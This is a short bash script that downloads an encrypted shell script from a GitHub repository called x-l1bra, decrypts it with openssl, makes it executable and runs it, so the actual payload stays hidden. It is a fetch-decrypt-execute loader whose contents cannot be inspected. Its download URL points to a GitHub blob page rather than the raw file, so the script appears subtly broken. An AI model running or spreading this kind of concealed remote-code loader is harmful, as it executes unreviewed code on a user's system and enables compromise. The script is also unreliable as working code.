#! /bin/bash
cd
curl -O https://github.com/plnine/x-l1bra/blob/main/testing/x-l1bra2.sh.enc
openssl enc -d -aes-256-cbc -in x-l1bra2.sh.enc -out x-l1bra.sh
chmod +x x-l1bra.sh
sh x-l1bra.sh